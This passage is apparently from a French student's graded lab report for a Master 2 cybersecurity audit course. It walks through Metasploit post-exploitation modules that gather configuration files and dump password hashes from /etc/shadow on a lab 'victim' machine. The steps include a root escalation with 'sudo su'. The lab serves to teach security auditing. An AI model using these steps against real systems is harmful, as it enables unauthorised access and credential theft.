+Ce post permet de collecter des informations de configuration système sur une machine Linux cible.
+
+J’exécute la commande « use post/linux/gather/enum_configs ».
+
+
+
+Figure 54. Exécution de la commande « use post/linux/gather/enum_configs » 
+
+3. Associer l’ID égal à 1 à la session,
+
+J’exécute la commande « set SESSION 1 ».
+
+
+
+Figure 55. Exécution de la commande « set SESSION 1 »
+
+
+4. Exécuter le post-exploit,
+
+J’exécute la commande « run » (ou « exploit »).
+
+
+Cette commande a pour effet de collecter un ensemble de fichiers de configuration présents sur la machine victime et de les stocker sur la machine attaquante Kali dans le répertoire « /root/.msf4/loot/ ».
+
+Voici la liste des fichiers collectés : apache2.conf, ports.conf, my.cnf, ufw.conf, sysctl.conf, shells, access.conf, rpc, logrotate.conf, smb.conf, ldap.conf, sysctl.conf
+
+Les fichiers sont renommés avec un nommage spécifique, comprenant notamment un timestamp, le nom du workspace, l’adresse IP de la machine victime et le nom du post utilisé. 
+Exemple : « 20250616233240_default_172.23.0.129_linux.enum.conf_631626.txt »
+
+
+
+Figure 56. Exécution de la commande « run »
+
+
+
+5. Revenir en arrière çà l’aide de la commande back, ensuite lister les informations de configuration récupérées (commande : msf6 > loot).
+
+J’exécute les commandes « back », puis « loot ».
+
+La commande loot permet d’afficher et de gérer les fichiers et données collectés au cours de l'exécution de modules Metasploit. 
+
+Je retrouve bien la liste des fichier collectés lors de l’exécution du « post enum_configs »: apache2.conf, ports.conf, my.cnf, ufw.conf, sysctl.conf, shells, access.conf, rpc, logrotate.conf, smb.conf, ldap.conf, sysctl.conf
+
+
+
+Figure 57. Exécution de la commande « loot »
+
+
+
+Conclusion pour la question Q07 : 
+Cette séquence montre par la pratique que le « post /linux/gather/enum_configs » permet de collecter des informations de configuration système sur une machine Linux cible.
+
+Question 08 : 
+1. Utiliser le post de récupération de hash (post/linux/gather/hashdump
+
+J’exécute la commande « use post/linux/gather/hashdump », puis « show options ».
+
+
+
+Figure 58. Exécution des commandes « use post/linux/gather/hashdump »
+
+
+2. Associer un ID à la session (ID = 1)
+
+J’exécute la commande « set SESSION 4 », parce que le post/linux/gather/hashdump demande des privilèges root, et cette session 4 en dispose.
+
+
+Figure 59. Exécution des commandes « set SESSION 4 » et « show options »
+
+
+3. Exécuter le poste-exploit 
+
+J’exécute la commande « run ».
+
+Figure 60. Exécution de la commande « run »
+
+
+4. Afficher les sessions en cours ses (commande : sessions)
+
+J’exécute la commande « sessions ».
+
+
+Figure 61. Exécution de la commande « sessions »
+
+
+
+5. Lancer la session 1 (commande : sessions -i 1)
+
+J’exécute la commande « sessions -i 4 », puis « whoami » qui indique que l’utilisateur est « msfadmin ».
+
+
+Figure 62. Exécution des commandes « sessions -i 1 », puis « whoami »
+
+
+6. Passer en sudo 
+
+J’exécute la commande « sudo su » pour passer en sudo.
+
+
+Figure 63. Exécution de la commande « sudo su »
+
+
+7. Afficher le nom de l’utilisateur en cours (avec whoami) 
+
+J’exécute la commande « whoami », qui indique que l’utilisateur est « root » maintenant. 
+
+Cette session permet ainsi de bénéficier des privilèges root, donc d’avoir un contrôle total sur la machine victime.
+
+
+Figure 64. Exécution de la commande « whoami »
+
+
+
+
+8. Exécuter la commande : Ctrl Z, suivie de la commande : (> back)
+
+
+9. A l’aide de la commande msf6 > creds, afficher les privilèges obtenus
+
+J’exécute la commande « creds ». 
+
+Le post que je viens d’effectuer m’a permis d’obtenir 7 credentials supplémentaires, y compris ceux du super utilisateur root.
+
+
+
+
+Figure 65. Exécution de la commande « creds »
+
+
+
+10. A l’aide de la commande sudo ls -l /root/.msf4/loot/, afficher la liste des fichiers de configurations récupérés
+
+J’exécute la commande « sudo ls -l /root/.msf4/loot/ ». 
+
+Elle permet de visualiser les 4 fichiers supplémentaires obtenus grâce au « post /linux/gather/hashdump ». Ces 4 fichiers sont issus de l’extraction des hachages de mots de passe des utilisateurs de la machine victime. 
+Ces hachages sont récupérés à partir du fichier /etc/shadow,
+
+
+
+
+
+Figure 66. Exécution de la commande « sudo ls -l /root/.msf4/loot/ »
+
+Conclusion pour la question Q08 : 
+Cette séquence montre par la pratique que le « post /linux/gather/hashdump » permet d’extraire les hachages de mots de passe des utilisateurs de la machine victime. 
+Ces hachages sont récupérés à partir du fichier /etc/shadow,
+
+
+
+Pierre SWEID
+Enseignant : CNAM ParisCursus : Master 2 Cyber 
+Module :  USCB 17-Audit technique  
+Objet : Mini-Projet noté  
+
+
+
+
+USCB17-M2 Orange-CR Projet-Le Louédec-Yannick         Page 1 sur 6
+
+
+
+
+
